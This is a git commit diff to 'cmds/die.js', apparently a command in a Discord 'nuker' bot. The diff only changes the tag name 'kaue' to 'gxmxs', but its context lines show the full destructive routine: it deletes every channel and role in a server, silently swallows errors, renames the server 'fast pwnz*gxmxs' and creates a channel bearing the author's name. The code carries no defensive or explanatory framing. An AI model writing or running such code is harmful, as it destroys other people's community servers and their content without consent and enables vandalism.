3d26bbc13629f65bf3ec1681c67ab68fee2b3007
gxmxs <105564814+gxmxs@users.noreply.github.com>
2022-05-16 22:37:36 -0300

    Update die.js

--- cmds/die.js
+++ cmds/die.js
@@ -5,9 +5,9 @@ exports.run = async (client, msg, args) => {
     await msg.guild.channels.forEach(c => c.delete().catch(() => {}))
     await msg.guild.roles.map(r => r.delete().catch(() => {}))
 
-    await msg.guild.setName('fast pwnz*kaue')
+    await msg.guild.setName('fast pwnz*gxmxs')
 
-    msg.guild.createChannel('kaue', {
+    msg.guild.createChannel('gxmxs', {
         type: 'text'
     }).catch(() => {})
 
